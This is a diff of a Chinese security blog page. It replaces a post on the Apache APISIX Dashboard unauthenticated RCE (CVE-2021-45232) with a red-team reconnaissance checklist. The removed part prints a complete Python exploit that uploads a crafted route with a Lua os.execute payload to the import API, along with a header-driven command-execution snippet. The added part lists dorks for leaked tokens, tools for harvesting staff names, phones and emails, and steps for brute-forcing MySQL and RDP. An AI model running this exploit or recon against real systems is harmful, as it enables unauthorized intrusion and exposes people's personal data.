@@ -94,7 +94,7 @@
 
 
 
-  <meta name="keywords" content="漏洞,Red Team," />
+  <meta name="keywords" content="Red Team,技术," />
 
 
 
@@ -106,20 +106,16 @@
 
 
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2021-45232 Apache APISIX RCE">
-<meta property="og:url" content="http://sunyyer.com/2022/03/24/CVE-20210-45232%20Apache%20APISIX%20RCE/index.html">
+<meta property="og:title" content="Red Team information collect">
+<meta property="og:url" content="http://sunyyer.com/2022/03/24/Red%20Team%20infromation%20collection/index.html">
 <meta property="og:site_name" content="云">
 <meta property="og:locale">
 <meta property="og:image" content="https://s2.loli.net/2022/03/24/zo7bk38KLADZm52.png">
-<meta property="og:image" content="https://s2.loli.net/2022/03/22/mQ3K8GVTEZ7v4Rf.png">
-<meta property="og:image" content="https://s2.loli.net/2022/03/22/HB1GZ3fSgFKzeqN.png">
-<meta property="og:image" content="https://s2.loli.net/2022/03/22/ULNuxwVJOvF31yD.png">
-<meta property="og:image" content="https://s2.loli.net/2022/03/22/eZSvy3w7snVlMpN.png">
 <meta property="article:published_time" content="2022-03-24T10:22:33.000Z">
-<meta property="article:modified_time" content="2022-03-25T15:53:28.237Z">
+<meta property="article:modified_time" content="2022-09-03T02:53:00.488Z">
 <meta property="article:author" content="sunyyer">
-<meta property="article:tag" content="漏洞">
 <meta property="article:tag" content="Red Team">
+<meta property="article:tag" content="技术">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://s2.loli.net/2022/03/24/zo7bk38KLADZm52.png">
 
@@ -151,13 +147,13 @@
 
 
 
-  <link rel="canonical" href="http://sunyyer.com/2022/03/24/CVE-20210-45232 Apache APISIX RCE/"/>
+  <link rel="canonical" href="http://sunyyer.com/2022/03/24/Red Team infromation collection/"/>
 
 
 
 
 
-  <title>CVE-2021-45232 Apache APISIX RCE | 云</title>
+  <title>Red Team information collect | 云</title>
   
 
 
@@ -294,7 +290,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://sunyyer.com/2022/03/24/CVE-20210-45232%20Apache%20APISIX%20RCE/">
+    <link itemprop="mainEntityOfPage" href="http://sunyyer.com/2022/03/24/Red%20Team%20infromation%20collection/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -311,7 +307,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">CVE-2021-45232 Apache APISIX RCE</h1>
+          <h1 class="post-title" itemprop="name headline">Red Team information collect</h1>
         
 
         <div class="post-meta">
@@ -375,8 +371,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2022/03/24/CVE-20210-45232%20Apache%20APISIX%20RCE/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2022/03/24/CVE-20210-45232%20Apache%20APISIX%20RCE/" itemprop="commentCount"></span>
+                <a href="/2022/03/24/Red%20Team%20infromation%20collection/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2022/03/24/Red%20Team%20infromation%20collection/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -412,35 +408,62 @@
         <p> <img src="https://s2.loli.net/2022/03/24/zo7bk38KLADZm52.png" alt="1kmk39_2560x1600.png"></p>
 <span id="more"></span>
 
-<h1 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h1><p>Apache APISIX 是一个动态、实时、高性能的 API 网关， 提供负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等丰富的流量管理功能。Apache APISIX Dashboard 使用户可通过前端界面操作 Apache APISIX。该漏洞的存在是由于 Manager API 中的错误。Manager API 在 gin 框架的基础上引入了 droplet 框架，所有的 API 和鉴权中间件都是基于 droplet 框架开发的。但是有些 API 直接使用了框架 gin 的接口，从而绕过身份验证。</p>
-<hr>
-<p><strong>Apache APISIX Dashboard 2.7 - 2.10 <em>版本受到影响</em></strong></p>
-<h3 id="下面两个接口没有做鉴定权限处理"><a href="#下面两个接口没有做鉴定权限处理" class="headerlink" title="下面两个接口没有做鉴定权限处理"></a>下面两个接口没有做鉴定权限处理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/apisix/admin/migrate/export  </span><br><span class="line">/apisix/admin/migrate/import </span><br></pre></td></tr></table></figure>
-<p>访问export接口，可以得到路由信息，浏览器自动download apisix-config.bak文件，包含所有路由信息。<br>import 接口可以导入路由配置。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ol>
-<li>docker环境</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/apisix-docker</span><br><span class="line">cd apisix-docker/example/</span><br><span class="line">vi docker-compose.yml     //修改两处版本号</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p><img src="https://s2.loli.net/2022/03/22/mQ3K8GVTEZ7v4Rf.png" alt="本地环境1.PNG"></p>
-<ol start="2">
-<li><p>默认登录端口为9000，可以看到登录web页面，admin/admin进入后台。</p>
-</li>
-<li><p>先创建上游节点，然后新增路由，选择上有服务器为之前添加的上游节点，like：</p>
-</li>
-</ol>
-<p><img src="https://s2.loli.net/2022/03/22/HB1GZ3fSgFKzeqN.png" alt="本地环境2.PNG"></p>
-<ol start="4">
-<li>在新增的路由中可以看到详细配置json，这也是后续RCE需要添加的格式，like：</li>
-</ol>
-<p><img src="https://s2.loli.net/2022/03/22/ULNuxwVJOvF31yD.png" alt="本地环境3.PNG"></p>
-<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>通过自己构造一个路由配置，将命令执行在script属性中，通过构造好的配置import到里面。<strong>需要注意的一点：传入的配置需要计算文件的checksum</strong></p>
-<p>checksum（校验和）是DEX位于文件头部的一个信息，用来判断DEX文件是否损坏或者被篡改，它位于头部的0x08偏移地址处，占用4个字节，采用小端序存储。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def calc_crc(data):</span><br><span class="line">    crc32 = zlib.crc32(data) &amp; 0xffffffff</span><br><span class="line">    return crc32.to_bytes(4, byteorder=&quot;big&quot;)</span><br></pre></td></tr></table></figure>
-<p>将构造好的路由信息上传到import接口，就可以修改或者新增路由。</p>
-<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p>路由信息需要触发，默认端口为9080，跟上路由uri就可以直接触发。如果管理端口关闭，直接在脚本中执行cmd命令。如：</p>
-<p><img src="https://s2.loli.net/2022/03/22/eZSvy3w7snVlMpN.png" alt="本地环境4.PNG"></p>
-<h2 id="POC-amp-EXP"><a href="#POC-amp-EXP" class="headerlink" title="POC&amp;EXP"></a>POC&amp;EXP</h2><p>代码来自互联网，感谢制作者：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">import random, string, json, zlib, requests</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&quot;script&quot;: &quot;local file = io.popen(ngx.re.get_headers()[&#x27;cmd&#x27;],&#x27;r&#x27;) \n local output = file:read(&#x27;*all&#x27;) \n</span><br><span class="line">file:close() \n ngx.say(output)q&quot;,</span><br><span class="line">我的理解是 这是通过lua语言写的通过请求头带上的cmd: rce，来替换&#x27;cmd&#x27;部分来执行命令</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">eval_config = &#123;</span><br><span class="line">    &quot;Counsumers&quot;: [],</span><br><span class="line">    &quot;Routes&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;id&quot;: str(random.randint(100000000000000000, 1000000000000000000)),</span><br><span class="line">            &quot;create_time&quot;: 1640674554,</span><br><span class="line">            &quot;update_time&quot;: 1640677637,</span><br><span class="line">            &quot;uris&quot;: [</span><br><span class="line">                &quot;/rce&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;name&quot;: &quot;rce&quot;,</span><br><span class="line">            &quot;methods&quot;: [</span><br><span class="line">                &quot;GET&quot;,</span><br><span class="line">                &quot;POST&quot;,</span><br><span class="line">                &quot;PUT&quot;,</span><br><span class="line">                &quot;DELETE&quot;,</span><br><span class="line">                &quot;PATCH&quot;,</span><br><span class="line">                &quot;HEAD&quot;,</span><br><span class="line">                &quot;OPTIONS&quot;,</span><br><span class="line">                &quot;CONNECT&quot;,</span><br><span class="line">                &quot;TRACE&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;script&quot;: &quot;os.execute(&#x27;touch /tmp/mytest&#x27;)&quot;,</span><br><span class="line">            &quot;status&quot;: 1</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;Services&quot;: [],</span><br><span class="line">    &quot;SSLs&quot;: [],</span><br><span class="line">    &quot;Upstreams&quot;: [],</span><br><span class="line">    &quot;Scripts&quot;: [],</span><br><span class="line">    &quot;GlobalPlugins&quot;: [],</span><br><span class="line">    &quot;PluginConfigs&quot;: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 将数据进行checksum</span><br><span class="line">def calc_crc(data):</span><br><span class="line">    crc32 = zlib.crc32(data) &amp; 0xffffffff</span><br><span class="line">    return crc32.to_bytes(4, byteorder=&quot;big&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def import_apix(url, data):</span><br><span class="line">    data = json.dumps(data).encode()  # 将数据进行转换为json存储到文件中，后面需要以文件上传</span><br><span class="line">    checksum = calc_crc(data)  # 进行checksum ，然后添加到数据后面</span><br><span class="line"></span><br><span class="line">    files = &#123;&quot;file&quot;: (&quot;data&quot;, data + checksum, &quot;text/data&quot;)&#125;</span><br><span class="line">    resp = requests.post(url + &quot;/apisix/admin/migrate/import&quot;, files=files, proxies=proxies, verify=False)</span><br><span class="line">    # proxies=proxies 这里是通过post去发包，走代理proxies</span><br><span class="line">    if resp.json().get(&quot;code&quot;, -1) == 0:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">这里定义的proxies为本地代理，这样运行时候就能用burp抓包了</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">proxies = &#123;</span><br><span class="line">    &quot;http&quot;: &quot;http://127.0.0.1:8080&quot;,</span><br><span class="line">    &quot;https&quot;: &quot;https://127.0.0.1:8080&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 生成一个随机路径</span><br><span class="line">def random_str():</span><br><span class="line">    return &#x27;&#x27;.join(random.choices(string.ascii_letters + string.digits, k=6))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"></span><br><span class="line">    uri = random_str()</span><br><span class="line">    print(uri)</span><br><span class="line">    eval_config[&quot;Routes&quot;][0][&quot;uris&quot;] = [&quot;/&quot; + uri]</span><br><span class="line">    eval_config[&quot;Routes&quot;][0][&quot;name&quot;] = uri</span><br><span class="line">    print(eval_config, end=&#x27;\n&#x27;)</span><br><span class="line">    if import_apix(&#x27;http://192.168.255.128:9000&#x27;, eval_config):</span><br><span class="line">        print(&quot;attack success&quot;)</span><br><span class="line">        print(&quot;uri is: &quot; + &quot;/&quot; + uri)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;attack error&quot;)</span><br></pre></td></tr></table></figure>
+<h1 id="0x01-目标信息结构收集"><a href="#0x01-目标信息结构收集" class="headerlink" title="0x01 目标信息结构收集"></a>0x01 目标信息结构收集</h1><p>收集目标的主站域名，控股公司，这个阶段是从互联网最浅层去收集域名信息，作为后续所有操作的基本目标。</p>
+<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p><strong>cSubsidiary利用天眼查查询企业子公司</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/canc3s/cSubsidiary">https://github.com/canc3s/cSubsidiary</a></p>
+<p><strong>公众号和APP的收集</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p>
+<h1 id="0x02-敏感信息收集"><a href="#0x02-敏感信息收集" class="headerlink" title="0x02 敏感信息收集"></a>0x02 敏感信息收集</h1><p>利用搜索引擎，gihub托管平台配置一些dork收集。</p>
+<p>​    1.googlehack</p>
+<p>​    2.github泄露    </p>
+<pre><code> 3.目标人员姓名手机邮箱
+</code></pre>
+<h2 id="googlehack"><a href="#googlehack" class="headerlink" title="googlehack"></a>googlehack</h2><p><a target="_blank" rel="noopener" href="https://github.com/r00tSe7en/GoogleHackingTool">https://github.com/r00tSe7en/GoogleHackingTool</a> 在线Google Hacking 小工具</p>
+<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a> 语法</p>
+<h2 id="github泄露"><a href="#github泄露" class="headerlink" title="github泄露"></a>github泄露</h2><p>可以先用dorks收集</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxxxx.com <span class="string">&quot;Authorization&quot;</span>     #<span class="string">&quot;Authorization: Bearer&quot;</span></span><br><span class="line">xxxxx.com  <span class="string">&quot;filename：vim_settings.xml&quot;</span></span><br><span class="line">xxxxx.com <span class="string">&quot;language：PHP&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>工具使用：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a> 指定一个项目中搜敏感信息</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/obheda12/GitDorker%E6%9C%AA%E8%83%BD%E8%B0%83%E8%AF%95%E6%88%90%E5%8A%9F">https://github.com/obheda12/GitDorker未能调试成功</a></p>
+<h2 id="目标人员姓名-手机-邮箱"><a href="#目标人员姓名-手机-邮箱" class="headerlink" title="目标人员姓名/手机/邮箱"></a>目标人员姓名/手机/邮箱</h2><p><a target="_blank" rel="noopener" href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a> 效果一般般</p>
+<p><a target="_blank" rel="noopener" href="https://app.snov.io/login">https://app.snov.io/login</a>  邮箱信息</p>
+<h1 id="0x03-域名主被动收集"><a href="#0x03-域名主被动收集" class="headerlink" title="0x03 域名主被动收集"></a>0x03 域名主被动收集</h1><h2 id="whois信息查询"><a href="#whois信息查询" class="headerlink" title="whois信息查询"></a>whois信息查询</h2><p>查询<strong>域名的whois</strong>,然后根据whois的信息来查询历史和反查，这样或许就可以得到一些邮箱和域名。</p>
+<p>主要看网址的注册人，到期记录，创建域的时间。除了正向查询whois，还要查询whois历史信息：</p>
+<p><a target="_blank" rel="noopener" href="https://tools.whoisxmlapi.com/whois-history-search">Domain Research Suite (whoisxmlapi.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.whoxy.com/">https://www.whoxy.com/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.reversewhois.io/">https://www.reversewhois.io/</a></p>
+<p>总结就是三步：先whois查询一个域名，然后对查询的信息进行历史whois查询和反差，最后得到一批邮箱和域名。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/melbadry9/WhoEnum">https://github.com/melbadry9/WhoEnum</a></p>
+<h2 id="DNS域名正向反向查询"><a href="#DNS域名正向反向查询" class="headerlink" title="DNS域名正向反向查询"></a>DNS域名正向反向查询</h2><h3 id="历史记录"><a href="#历史记录" class="headerlink" title="历史记录"></a>历史记录</h3><p>Dnsdumpster 是一个在线实用程序，我们使用它来查找子域、目标的 DNS 记录。</p>
+<h3 id="IP反查"><a href="#IP反查" class="headerlink" title="IP反查"></a>IP反查</h3><p>同ip查询多个解析到这个ip的域名，寻找更多web资产，IP反查也可以使用dig，nslookup,host命令完成：</p>
+<p><a target="_blank" rel="noopener" href="https://viewdns.info/reverseip/">https://viewdns.info/reverseip/</a></p>
+<p><a target="_blank" rel="noopener" href="https://dnslytics.com/">https://dnslytics.com/</a></p>
+<p>工具</p>
+<p><a target="_blank" rel="noopener" href="https://www.infobyip.com/ipbulklookup.php">https://www.infobyip.com/ipbulklookup.php</a> 批量ip反查</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Sma11New/ip2domain">https://github.com/Sma11New/ip2domain</a> 国内域名推荐ip2domain，会查询权重、ICP备案等</p>
+<h3 id="子域名探测爆破"><a href="#子域名探测爆破" class="headerlink" title="子域名探测爆破"></a>子域名探测爆破</h3><p>常见手法爆破子域名、证书透明度、搜索引擎、信息泄露、ASN号、过滤泛解析</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/six2dez/reconftw">https://github.com/six2dez/reconftw</a></p>
+<h1 id="0x4-整理域名IP资产"><a href="#0x4-整理域名IP资产" class="headerlink" title="0x4 整理域名IP资产"></a>0x4 整理域名IP资产</h1><ul>
+<li>一批待探测存活的域名</li>
+<li>一批待确定的ip段</li>
+<li>一些邮箱，姓名，手机号</li>
+<li>一些敏感文件、信息、通用密码(敏感信息收集阶段看脸)</li>
+</ul>
+<p>判断IP属于不属于CDN,属于不属于泛解析，转成IP后要判断啊IP段的权重，哪些段可能是目标主要的C段</p>
+<p>工具，整理查看权重（未成功）</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/canc3s/cIPR">https://github.com/canc3s/cIPR</a></p>
+<h1 id="0x05-扫描检测打点"><a href="#0x05-扫描检测打点" class="headerlink" title="0x05 扫描检测打点"></a>0x05 扫描检测打点</h1><h2 id="域名需要做的事"><a href="#域名需要做的事" class="headerlink" title="域名需要做的事"></a>域名需要做的事</h2><ul>
+<li>探测存活</li>
+<li>title、banner提取、指纹识别</li>
+<li>爬虫、目录轻量扫描、轻量漏扫</li>
+</ul>
+<h2 id="C段需要做的事"><a href="#C段需要做的事" class="headerlink" title="C段需要做的事"></a>C段需要做的事</h2><ul>
+<li>扫描端口，探测存活</li>
+<li>将扫的web和非web进行分类，把扫到的web资产加入到域名需要做的事，和对待域名没区别</li>
+<li>将扫到的非web(数据库/远程登录协议)进行爆破，比如mysql爆破，rdp爆破</li>
+</ul>
 
       
     </div>
@@ -461,7 +484,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://sunyyer.com/2022/03/24/CVE-20210-45232%20Apache%20APISIX%20RCE/" title="CVE-2021-45232 Apache APISIX RCE">http://sunyyer.com/2022/03/24/CVE-20210-45232%20Apache%20APISIX%20RCE/</a>
+    <a href="http://sunyyer.com/2022/03/24/Red%20Team%20infromation%20collection/" title="Red Team information collect">http://sunyyer.com/2022/03/24/Red%20Team%20infromation%20collection/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -476,9 +499,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag"># 漏洞</a>
-          
             <a href="/tags/Red-Team/" rel="tag"># Red Team</a>
+          
+            <a href="/tags/%E6%8A%80%E6%9C%AF/" rel="tag"># 技术</a>
           
         </div>
       
@@ -491,8 +514,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2022/02/10/Introduction/" rel="next" title="国内VPS访问国外源">
-                <i class="fa fa-chevron-left"></i> 国内VPS访问国外源
+              <a href="/2022/03/24/CVE-2021-45232%20Apache%20APISIX%20RCE/" rel="next" title="CVE-2021-45232 Apache APISIX RCE">
+                <i class="fa fa-chevron-left"></i> CVE-2021-45232 Apache APISIX RCE
               </a>
             
           </div>
@@ -500,6 +523,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2022/03/26/API%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="prev" title="">
+                 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -579,7 +606,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">20</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -601,7 +628,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -634,7 +661,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="nav-number">1.</span> <span class="nav-text">未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E9%9D%A2%E4%B8%A4%E4%B8%AA%E6%8E%A5%E5%8F%A3%E6%B2%A1%E6%9C%89%E5%81%9A%E9%89%B4%E5%AE%9A%E6%9D%83%E9%99%90%E5%A4%84%E7%90%86"><span class="nav-number">1.0.1.</span> <span class="nav-text">下面两个接口没有做鉴定权限处理</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#RCE"><span class="nav-number">2.</span> <span class="nav-text">RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack"><span class="nav-number">2.1.</span> <span class="nav-text">Attack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC-amp-EXP"><span class="nav-number">2.2.</span> <span class="nav-text">POC&amp;EXP</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-%E7%9B%AE%E6%A0%87%E4%BF%A1%E6%81%AF%E7%BB%93%E6%9E%84%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">0x01 目标信息结构收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Tools"><span class="nav-number">1.1.</span> <span class="nav-text">Tools</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">0x02 敏感信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#googlehack"><span class="nav-number">2.1.</span> <span class="nav-text">googlehack</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#github%E6%B3%84%E9%9C%B2"><span class="nav-number">2.2.</span> <span class="nav-text">github泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E6%A0%87%E4%BA%BA%E5%91%98%E5%A7%93%E5%90%8D-%E6%89%8B%E6%9C%BA-%E9%82%AE%E7%AE%B1"><span class="nav-number">2.3.</span> <span class="nav-text">目标人员姓名&#x2F;手机&#x2F;邮箱</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-%E5%9F%9F%E5%90%8D%E4%B8%BB%E8%A2%AB%E5%8A%A8%E6%94%B6%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text">0x03 域名主被动收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#whois%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2"><span class="nav-number">3.1.</span> <span class="nav-text">whois信息查询</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS%E5%9F%9F%E5%90%8D%E6%AD%A3%E5%90%91%E5%8F%8D%E5%90%91%E6%9F%A5%E8%AF%A2"><span class="nav-number">3.2.</span> <span class="nav-text">DNS域名正向反向查询</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95"><span class="nav-number">3.2.1.</span> <span class="nav-text">历史记录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IP%E5%8F%8D%E6%9F%A5"><span class="nav-number">3.2.2.</span> <span class="nav-text">IP反查</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A2%E6%B5%8B%E7%88%86%E7%A0%B4"><span class="nav-number">3.2.3.</span> <span class="nav-text">子域名探测爆破</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-%E6%95%B4%E7%90%86%E5%9F%9F%E5%90%8DIP%E8%B5%84%E4%BA%A7"><span class="nav-number">4.</span> <span class="nav-text">0x4 整理域名IP资产</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-%E6%89%AB%E6%8F%8F%E6%A3%80%E6%B5%8B%E6%89%93%E7%82%B9"><span class="nav-number">5.</span> <span class="nav-text">0x05 扫描检测打点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E5%90%8D%E9%9C%80%E8%A6%81%E5%81%9A%E7%9A%84%E4%BA%8B"><span class="nav-number">5.1.</span> <span class="nav-text">域名需要做的事</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#C%E6%AE%B5%E9%9C%80%E8%A6%81%E5%81%9A%E7%9A%84%E4%BA%8B"><span class="nav-number">5.2.</span> <span class="nav-text">C段需要做的事</span></a></li></ol></li></ol></div>
             
 
           </div>
